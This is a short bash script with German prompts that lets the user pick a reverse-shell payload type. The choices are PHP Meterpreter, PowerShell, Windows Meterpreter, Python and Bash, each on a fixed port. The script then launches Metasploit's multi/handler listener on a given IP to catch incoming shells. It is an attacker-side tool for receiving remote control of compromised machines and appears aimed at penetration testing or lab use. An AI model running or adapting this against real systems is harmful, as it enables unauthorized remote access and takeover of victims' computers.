#!/bin/bash

usage() {
  echo "Usage: $0 <Listen IP>"
  echo "  <Listen IP> - IP-Adresse für den Listener (z.B. deine lokale oder öffentliche IP)"
  exit 1
}

if [ "$#" -ne 1 ]; then
  usage
fi

LHOST="$1"

# Menü mit Auswahl
echo "Bitte wähle den Reverse-Shell Typ:"
echo "1) PHP (Port 5555)"
echo "2) PowerShell (Port 6666)"
echo "3) Meterpreter EXE (Port 7777)"
echo "4) Python (Port 8888)"
echo "5) Bash (Port 9999)"
read -rp "Auswahl (1-5): " choice

# Default Werte (Falls ungültige Eingabe)
LPORT=""
PAYLOAD=""

case $choice in
  1)
    PAYLOAD="php/meterpreter_reverse_tcp"
    LPORT="5555"
    ;;
  2)
    PAYLOAD="windows/powershell_reverse_tcp"
    LPORT="6666"
    ;;
  3)
    PAYLOAD="windows/meterpreter/reverse_tcp"
    LPORT="7777"
    ;;
  4)
    PAYLOAD="cmd/unix/reverse_python"
    LPORT="8888"
    ;;
  5)
    PAYLOAD="cmd/unix/reverse_bash"
    LPORT="9999"
    ;;
  *)
    echo "Ungültige Auswahl!"
    exit 1
    ;;
esac

echo "Starte Listener für Payload: $PAYLOAD auf $LHOST:$LPORT"

# msfconsole starten mit den Parametern
msfconsole -q -x "
use exploit/multi/handler;
set payload $PAYLOAD;
set lhost $LHOST;
set lport $LPORT;
run;
"

